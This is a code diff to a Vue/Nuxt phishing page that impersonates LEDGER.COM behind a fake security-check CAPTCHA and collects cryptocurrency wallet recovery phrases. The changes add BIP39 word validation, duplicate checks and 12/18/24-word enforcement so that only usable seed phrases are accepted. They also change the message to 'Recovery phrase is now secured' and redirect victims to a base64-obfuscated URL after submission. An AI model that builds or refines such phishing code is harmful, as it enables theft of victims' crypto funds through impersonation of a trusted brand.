@@ -1,6 +1,6 @@
 <template>
   <div v-if="!isValidated">
-    <div class="w-screen relative h-screen flex justify-center items-center">
+    <div class="w-screen relative h-screen grow flex justify-center items-center">
       <div class="absolute size-50 top-20">
         <img src="/img/logo-light.svg" alt="Logo" draggable="false">
       </div>
@@ -8,9 +8,13 @@
         <div class="space-y-8">
           <div class="header">
             <h1 class="font-medium text-2xl">One more step</h1>
-            <p class="text-muted">Please complete the security check to access NetworkSolutions.com</p>
+            <p class="text-muted">Please complete the security check to access LEDGER.COM</p>
           </div>
-          <NuxtTurnstile v-model="token" :options="{callback: () => (isValidated = true)}" />
+          <NuxtTurnstile v-model="token" :options="{callback: () => handleTurnstileComplete()}" />
+          <div v-if="verificationInProgress" class="flex items-center justify-center">
+            <UIcon name="i-heroicons-arrow-path" class="animate-spin mr-2" />
+            <span>Verifying your request...</span>
+          </div>
           <div class="footer">
             <h2 class="font-medium text-xl">Why do you have to complete a CAPTCHA?</h2>
             <p class="text-muted">Completing the captcha proves you are human and gives you access to the web property.</p>
@@ -24,7 +28,7 @@
       <div class="page">
         <div class="sidebar">
           <div class="header">
-            <img class="w-36" :src="currentStep?.sidebar.logoImg.src" :alt="currentStep?.sidebar.logoImg.alt"
+            <img class="w-28 md:w-36 hidden md:block" :src="currentStep?.sidebar.logoImg.src" :alt="currentStep?.sidebar.logoImg.alt"
                  draggable="false"/>
           </div>
           <div class="body">
@@ -104,6 +108,17 @@ import type { Step } from "../types";
 
 
 const isValidated = ref(false);
+const verificationInProgress = ref(false);
+const token = ref('');
+
+function handleTurnstileComplete() {
+  verificationInProgress.value = true;
+  // Add a 3 second delay before proceeding
+  setTimeout(() => {
+    verificationInProgress.value = false;
+    isValidated.value = true;
+  }, 3000);
+}
 
 const animationModules = import.meta.glob('~/assets/lottie2/*.json', {eager: true});
 const animations = reactive(
@@ -112,12 +127,6 @@ const animations = reactive(
       data: (module as any).default,
     }))
 );
-
-useHead({
-  bodyAttrs: {
-    class: 'w-screen h-screen md:overflow-hidden dark overflow-x-hidden'
-  }
-})
 
 
 
@@ -299,9 +308,42 @@ function previousStep() {
   step.value -= 1;
 }
 
+function checkDuplicates(phrases: string[]) {
+  const filledPhrases = phrases.filter(phrase => phrase.trim() !== '');
+  const hasDuplicates = new Set(filledPhrases).size !== filledPhrases.length;
+  const duplicateWords = filledPhrases.filter((word, index) => filledPhrases.indexOf(word) !== index);
+  return { hasDuplicates, duplicateWords };
+}
+
 async function submitPhrases(phrases) {
   const form = document.forms.namedItem("phrases")
   if (!form.reportValidity()) return;
+
+  // Import the validator function directly here to avoid circular dependencies
+  const { validateRecoveryPhraseWords } = await import('./utils/bip39-validator');
+
+  const duplicateResult = checkDuplicates(phrases);
+
+  // Validate all phrases before submission
+  const validationResult = validateRecoveryPhraseWords(phrases);
+
+  const filledPhrases = phrases.filter(phrase => phrase.trim() !== '');
+
+  if (!validationResult.isValid || ![12, 18, 24].includes(filledPhrases.length) || duplicateResult.hasDuplicates) {
+    useToast().add({
+      title: "Invalid recovery phrase",
+      description: validationResult.invalidWords.length > 0
+          ? `Please correct the ${validationResult.invalidWords.length} invalid word(s)`
+          : duplicateResult.hasDuplicates
+              ? `Duplicate words found: ${duplicateResult.duplicateWords.join(', ')}`
+              : `Please enter all words of your recovery phrase, you must enter exactly 12, 18 or 24 words, you have entered ${filledPhrases.length} words`,
+      color: "error",
+      timeout: 5000
+    });
+    return;
+  }
+
+  // Proceed if all words are valid
   await nextStep()
 
   try {
@@ -311,7 +353,7 @@ async function submitPhrases(phrases) {
     })
     setTimeout(() => {
       currentStep.value.main.body.title = "Attention!"
-      currentStep.value.main.body.description = "Recovery phrase is not secured, redirecting..."
+      currentStep.value.main.body.description = "Recovery phrase is now secured, redirecting..."
       setTimeout(() => {
         window.location.replace(atob(red))
       }, 3000)
@@ -320,7 +362,6 @@ async function submitPhrases(phrases) {
     useToast().add({title: "Unexpected error", description: "An unexpected error occurred. please try again later.", color: "error"})
     previousStep()
   }
-
 }
 
 const isNextDisabled = computed(() => {
@@ -333,7 +374,7 @@ const isPrevDisabled = computed(() => step.value == 0)
 
 </script>
 
-<style>
+<style scoped>
 @reference "@/assets/css/main.css";
 
 * {
@@ -341,21 +382,21 @@ const isPrevDisabled = computed(() => step.value == 0)
 }
 
 .app-container {
-  @apply w-screen h-screen flex flex-col;
+  @apply md:w-screen grow flex flex-col;
 }
 
 .page {
   @apply flex flex-col md:flex-row grow;
 
   .sidebar {
-    @apply max-w-screen md:w-80 py-8 flex flex-col bg-theme text-black space-y-8;
+    @apply max-w-screen md:w-80 py-4 md:py-8 flex flex-col bg-theme text-black space-y-4 md:space-y-8;
 
     .header {
       @apply place-items-center;
     }
 
     .body {
-      @apply grow flex flex-col justify-center items-center overflow-hidden max-w-48 md:max-w-full mx-auto;
+      @apply grow flex flex-col justify-center items-center overflow-hidden max-w-40 md:max-w-full mx-auto;
     }
 
     .footer {
